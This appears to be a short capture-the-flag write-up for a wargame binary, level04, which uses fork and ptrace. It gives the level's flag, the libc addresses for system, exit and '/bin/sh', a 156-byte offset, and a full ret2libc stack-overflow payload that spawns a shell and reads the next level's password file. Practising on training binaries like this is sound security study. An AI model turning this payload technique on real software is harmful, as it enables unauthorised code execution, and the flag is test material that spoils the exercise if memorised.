flag: 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN

This level uses fork and ptrace. The child reads the stdin one time and does absolutely
nothing with it.

This level is another ret2libc, the particularity being that the program uses fork.
This makes it a bit more complicated to debug using gdb, as I have to use
> set follow-fork-mode child
to navigate to the child process.

The programs may be trying to give hints by telling you to use shellcodes but I hate
shellcodes and I will be avoiding them by all means.

> p system
0xf7e6aed0

> p exit
0xf7e5eb70

> find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec

I found that the offset is 156 using gdb, the command to set the fork mode as child and
a pattern generator.

(python -c 'print "A"*156+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"'; cat) | ./level04

> cat /home/users/level05/.pass

Notes:

	x = ptrace(PTRACE_PEEKUSER, pid, 0x2c, 0);
returns the eip of pid

	prctl(1,1);
means that if the parent dies, the child gets a SIGHUP.

  if (((local_a4 & 0x7f) == 0) ||
	 (local_1c = local_a4, '\0' < (char)(((byte)local_a4 & 0x7f) + 1) >> 1))
checks if the child exited normally or received a signal
